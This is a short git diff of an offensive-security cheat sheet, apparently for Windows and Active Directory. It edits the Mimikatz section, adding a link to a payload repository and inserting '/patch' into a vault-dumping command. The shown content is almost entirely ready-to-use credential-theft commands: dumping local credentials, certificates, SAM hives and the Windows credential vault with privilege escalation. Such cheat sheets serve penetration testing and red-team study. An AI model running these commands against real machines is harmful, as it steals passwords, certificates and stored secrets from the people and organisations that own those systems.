@@ -162,6 +162,8 @@ lsadump::sam SamBkup.hiv SystemBkup.hiv
 ```
 
 ## Mimikatz
+- Check out https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md for more commands
+
 #### Mimikatz dump credentials on local machine
 ```
 Invoke-Mimikatz -Dumpcreds
@@ -179,7 +181,7 @@ Invoke-Mimikatz –DumpCerts
 
 #### Mimikatz dump vault
 ```
-Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred" "vault::list"'
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "vault::cred /patch" "vault::list"'
 ```
 
 #### Mimikatz dump all to find privs
